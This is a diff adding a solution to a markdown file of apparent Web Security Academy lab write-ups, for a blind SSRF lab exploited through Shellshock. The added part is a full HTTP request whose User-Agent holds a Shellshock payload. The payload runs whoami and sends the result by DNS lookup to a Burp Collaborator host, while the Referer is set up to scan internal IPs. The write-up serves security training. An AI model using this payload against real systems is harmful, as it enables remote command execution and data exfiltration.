@@ -52,4 +52,22 @@ Referer: http://burpcollaborator.net
 ```
 
 ### Blind SSRF with Shellshock exploitation
-TODO: Expert
+```
+GET /product?productId=1 HTTP/1.1
+Host: ac961fd61f73d8dc807c03f100bb00fa.web-security-academy.net
+Connection: close
+Cache-Control: no-transform
+Upgrade-Insecure-Requests: 1
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).1rt8(..).burpcollaborator.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Referer: http://192.168.0.§1§:8080
+Accept-Encoding: gzip, deflate
+Accept-Language: cs-CZ,cs;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=f1DZBykzdTJ2yqzaURtBwHCWqFgb6jD2
+```
+
+Notice `User-agent` (Shellshock) and `Referer` headers.
+Start the attack (IPs from .1 to .255)
+Burp Collaborator interaction: `peter-cqzxuc.1rt8ltf3qtpbp5r6uzgorv4syj49sy.burpcollaborator.net.`
